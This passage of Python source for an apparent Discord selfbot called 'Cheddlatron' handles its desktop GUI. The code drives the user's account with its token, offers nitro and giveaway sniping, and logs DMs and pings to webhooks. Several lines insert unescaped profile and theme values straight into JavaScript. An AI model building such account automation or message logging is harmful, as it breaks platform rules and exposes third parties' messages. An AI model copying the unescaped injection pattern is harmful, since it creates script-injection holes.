        window.evaluate_js(f'document.getElementById("EmbedTitleUrl").querySelector(".character-count-container textarea").value = "{ethemetitleurl}"')
        window.evaluate_js(f'document.getElementById("EmbedCMDUrl").querySelector(".character-count-container textarea").value = "{ethemecmdurl}"')

    def setethemers(self, etheme):
        theme_path = f"Data/Settings/Configs/Ethemes/{etheme}.json"

        try:
            if not os.path.exists(theme_path):
                print(f"Error: Theme file '{theme_path}' does not exist.")
                return
            with open(theme_path, "r") as theme_file:
                content = theme_file.read()
            if not content.strip():
                print(f"Error: Theme file '{theme_path}' is empty.")
                return
            jsoni = json.loads(content)
            required_keys = ['color', 'image', 'title_url', 'cmd_url']
            missing_keys = [key for key in required_keys if key not in jsoni]
            if missing_keys:
                print(f"Error: Missing required keys in theme file: {missing_keys}")
                return
            window.evaluate_js(f"setColor('{jsoni['color']}');")
            ethemeimg = jsoni['image']
            ethemetitleurl = jsoni['title_url']
            ethemecmdurl = jsoni['cmd_url']
            window.evaluate_js(f'document.getElementById("EmbedImage").querySelector(".character-count-container textarea").value = "{ethemeimg}"')
            window.evaluate_js(f'document.getElementById("EMBEDIMGURL").src = "{ethemeimg}"')
            window.evaluate_js(f'document.getElementById("EmbedTitleUrl").querySelector(".character-count-container textarea").value = "{ethemetitleurl}"')
            window.evaluate_js(f'document.getElementById("EmbedCMDUrl").querySelector(".character-count-container textarea").value = "{ethemecmdurl}"')

        except FileNotFoundError:
            print(f"Error: Theme file '{theme_path}' not found.")
        except json.JSONDecodeError as e:
            print(f"Error parsing JSON in theme file: {e}")
        except KeyError as e:
            print(f"Error: Missing required key in theme file: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {str(e)}")

    def saveethemers(self, name, color, image, title_url, cmd_url):
        theme_path = f"Data/Settings/Configs/Ethemes/{name}.json"
        data = {
            "color": color,
            "image": image,
            "title_url": title_url,
            "cmd_url": cmd_url
        }
        with open(theme_path, "w") as theme_file:
            json.dump(data, theme_file, indent=4)

    def createnewetheme(self, name):
        name = filesafe(name)
        theme_path = f"Data/Settings/Configs/Ethemes/{name}.json"
        data = {
            "color": "#FFFFFF",
            "image": "",
            "title_url": "",
            "cmd_url": ""
        }
        with open(theme_path, "w") as theme_file:
            json.dump(data, theme_file, indent=4)


    def sendnotif(self, message):
        notif(message)


def extract_urls(obj, urls=set()):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if isinstance(value, dict):
                extract_urls(value, urls)
            elif isinstance(value, list):
                for item in value:
                    extract_urls(item, urls)
            elif isinstance(value, str) and value.startswith('http'):
                urls.add(value)
    elif isinstance(obj, list):
        for item in obj:
            extract_urls(item, urls)
    return urls

def commandrecs():
    custom_cmds = []
    non_custom_cmds = []
    
    for command in Cheddlatron.commands:
        command_info = {
            'name': command.name,
            'description': command.description,
            'help': command.help
        }
        if command.name == f"{config_get('prefix')}{config_get('prefix')}":
            pass
        elif command.name in ccs:
            custom_cmds.append(command_info)
        else:
            non_custom_cmds.append(command_info)

    return non_custom_cmds, custom_cmds

def update_profile():
    resp = requesters.get("https://discord.com/api/v9/users/@me", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    id = resp['id']
    globalusername = resp['global_name']
    accname = resp['username']
    biotext = resp['bio']
    biotext = biotext.replace('"', r'\"').replace('\n', '\\n')
    avatar = resp['avatar']
    if resp['avatar'] != None:
        avatartype = getmediatype(f"https://cdn.discordapp.com/avatars/{id}/{avatar}") 
        pfpurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}.{avatartype}"
    else:
        pfpurl = "https://archive.org/download/com.hammerandchisel.discord-i-os-8.1-clutch-2.0.4-v-2.2.4/com.hammerandchisel.discord-iOS8.1-%28Clutch-2.0.4%29%20%28v2.2.4%29.png"
    window.evaluate_js(f'document.getElementById("pfp").src = "{pfpurl}"')
    window.evaluate_js(f'document.querySelector(".profile-text h2").innerText = "{globalusername}"')
    window.evaluate_js(f'document.querySelector(".profile-text p").innerText = "{accname}"')
    window.evaluate_js(f'document.querySelector(".biobox").innerText = "{biotext}"')
    window.evaluate_js(f'fetchBadges()')

def load_profile():
    window.evaluate_js("adjustDisplayPosition();")
    window.evaluate_js("fetchBadges();")
    resp = requesters.get("https://discord.com/api/v9/users/@me", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    friends = requesters.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    guilds = requesters.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
    friends = [record for record in friends if record["type"] != 4 and record["type"] != 3 and record["type"] != 2]
    friendnum = len(friends)
    guildnum = len(guilds)
    id = resp['id']
    globalusername = resp['global_name']
    accname = resp['username']
    biotext = resp['bio']
    biotext = biotext.replace('"', r'\"').replace('\n', '\\n')
    avatar = resp['avatar']
    cmdcount = len(Cheddlatron.commands)
    if resp['avatar'] != None:
        avatartype = getmediatype(f"https://cdn.discordapp.com/avatars/{id}/{avatar}") 
        pfpurl = f"https://cdn.discordapp.com/avatars/{id}/{avatar}.{avatartype}"
    else:
        pfpurl = "https://archive.org/download/com.hammerandchisel.discord-i-os-8.1-clutch-2.0.4-v-2.2.4/com.hammerandchisel.discord-iOS8.1-%28Clutch-2.0.4%29%20%28v2.2.4%29.png"
    window.evaluate_js(f'document.getElementById("pfp").src = "{pfpurl}"')
    window.evaluate_js(f'document.querySelector(".profile-text h2").innerText = "{globalusername}"')
    window.evaluate_js(f'document.querySelector(".profile-text p").innerText = "{accname}"')
    window.evaluate_js(f'document.querySelector(".biobox").innerText = "{biotext}"')
    window.evaluate_js(f'document.getElementById("friendnum").innerText = "{friendnum}"')
    window.evaluate_js(f'document.getElementById("guildnum").innerText = "{guildnum}"')
    window.evaluate_js(f'document.getElementById("cmdcount").innerText = "{cmdcount}"')
    window.evaluate_js(f'document.getElementById("ver").innerText = "{ver}"')
    window.evaluate_js(f"updateProgressBars({friendnum}, {guildnum});")
    #config shit
    token = config_get('token')
    prefix = config_get('prefix')
    deltimer = config_get('delete_timer')
    afkmode = config_get('afkmode')
    afkmsg = config_get('afkmsg')
    devicee = config_get('device')
    embedmode = config_get('embed_mode')
    nitrosniper = config_get('nitro_sniper')
    giveawaysniper = config_get('giveaway_sniper')
    nitrotoken = config_get('nitro_sniper_redeemer')
    givedelay = config_get('giveaway_delay')
    pinglog = config_get('pinglogger')
    dmlog = config_get('dmlogger')
    sessionlog = config_get('sessionlogger')
    nitrohook = config_get('nitro_webhook_url')
    givehook = config_get('giveaway_webhook_url')
    pinghook = config_get('pinglogger_webhook_url')
    dmhook = config_get('dmlogger_webhook_url')
    webhooknotif = config_get('webhooknotifs')
    ctheme = config_get('theme') if config_get('theme') != "" else ""
    etheme = config_get('etheme')
    window.evaluate_js(f'document.getElementById("token").querySelector(".character-count-container textarea").value = {json.dumps(token)}')
    window.evaluate_js(f'document.getElementById("prefix").querySelector(".character-count-container textarea").value = {json.dumps(prefix)}')
    window.evaluate_js(f'document.getElementById("delete_timer").querySelector(".character-count-container textarea").value = {json.dumps(deltimer)}')
    window.evaluate_js(f'settoggle(document.getElementById("afkmode").querySelector(".toggle-switch input"), {json.dumps(bool(afkmode))});')
    window.evaluate_js(f'document.getElementById("afkmsg").querySelector(".character-count-container textarea").value = {json.dumps(afkmsg)}')
    window.evaluate_js(f'document.getElementById("DeviceDropdown").value = {json.dumps(devicee)}')
    window.evaluate_js(f'document.getElementById("EmbedDropdown").value = {json.dumps(embedmode)}')
    window.evaluate_js(f'document.getElementById("CThemeDropdown").value = {json.dumps(ctheme)}')
    window.evaluate_js(f'document.getElementById("EThemeDropdown").value = {json.dumps(etheme)}')
    window.evaluate_js(f'settoggle(document.getElementById("nitro_sniper").querySelector(".toggle-switch input"), {json.dumps(bool(nitrosniper))});')
    window.evaluate_js(f'settoggle(document.getElementById("giveaway_sniper").querySelector(".toggle-switch input"), {json.dumps(bool(giveawaysniper))});')
    window.evaluate_js(f'document.getElementById("nitro_sniper_redeemer").querySelector(".character-count-container textarea").value = {json.dumps(nitrotoken)}')
    window.evaluate_js(f'document.getElementById("giveaway_delay").querySelector(".character-count-container textarea").value = {json.dumps(givedelay)}')
    window.evaluate_js(f'settoggle(document.getElementById("pinglogger").querySelector(".toggle-switch input"), {json.dumps(bool(pinglog))});')
    window.evaluate_js(f'settoggle(document.getElementById("dmlogger").querySelector(".toggle-switch input"), {json.dumps(bool(dmlog))});')
    window.evaluate_js(f'settoggle(document.getElementById("sessionlogger").querySelector(".toggle-switch input"), {json.dumps(bool(sessionlog))});')
    window.evaluate_js(f'document.getElementById("nitro_webhook_url").querySelector(".character-count-container textarea").value = {json.dumps(nitrohook)}')
    window.evaluate_js(f'document.getElementById("giveaway_webhook_url").querySelector(".character-count-container textarea").value = {json.dumps(givehook)}')
    window.evaluate_js(f'document.getElementById("pinglogger_webhook_url").querySelector(".character-count-container textarea").value = {json.dumps(pinghook)}')
    window.evaluate_js(f'document.getElementById("dmlogger_webhook_url").querySelector(".character-count-container textarea").value = {json.dumps(dmhook)}')
    window.evaluate_js(f'settoggle(document.getElementById("webhooknotifs").querySelector(".toggle-switch input"), {json.dumps(bool(webhooknotif))});')
    window.evaluate_js("document.body.classList.add('loaded')")
    


def is_webview2_installed():
    reg_keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\EdgeUpdate\Clients\{F2C6D6F8-3BBA-4256-B27C-C3073ACEC214}"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\EdgeUpdate\Clients\{F2C6D6F8-3BBA-4256-B27C-C3073ACEC214}"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F2C6D6F8-3BBA-4256-B27C-C3073ACEC214}"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F2C6D6F8-3BBA-4256-B27C-C3073ACEC214}")
    ]

    for hive, path in reg_keys:
        try:
            with winreg.OpenKey(hive, path) as key:
                version, _ = winreg.QueryValueEx(key, "pv")
                return True, version
        except FileNotFoundError:
            continue
    directories = [
        r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application",
        r"C:\Program Files\Microsoft\EdgeWebView\Application"
    ]
    
    for directory in directories:
        if os.path.exists(directory) and any(os.scandir(directory)):
            return True, directory
    return False, None

def run_webview():
    global api
    global window
    api = API()
    window = webview.create_window('Cheddlatron', pkg_resources.resource_filename(__name__, 'GUI.html'), js_api=api, frameless=True, width=1080, height=700, easy_drag=False, vibrancy=True)
    webview.start(load_profile, gui='edgechromium')

def runbot():
    asyncio.run(Cheddlatron.start(config_get("token")))

installed, dwiuahudiwahwad = is_webview2_installed()

if installed:
    discord_thread = threading.Thread(target=runbot, daemon=True)
    discord_thread.start()
    run_webview()

else:
    print("Could not find Webview install, please install Microsoft Webview and rerun Cheddlatron.")
    webbrowser.open("https://developer.microsoft.com/en-us/microsoft-edge/webview2/?form=MA13LH#download")
    time.sleep(5)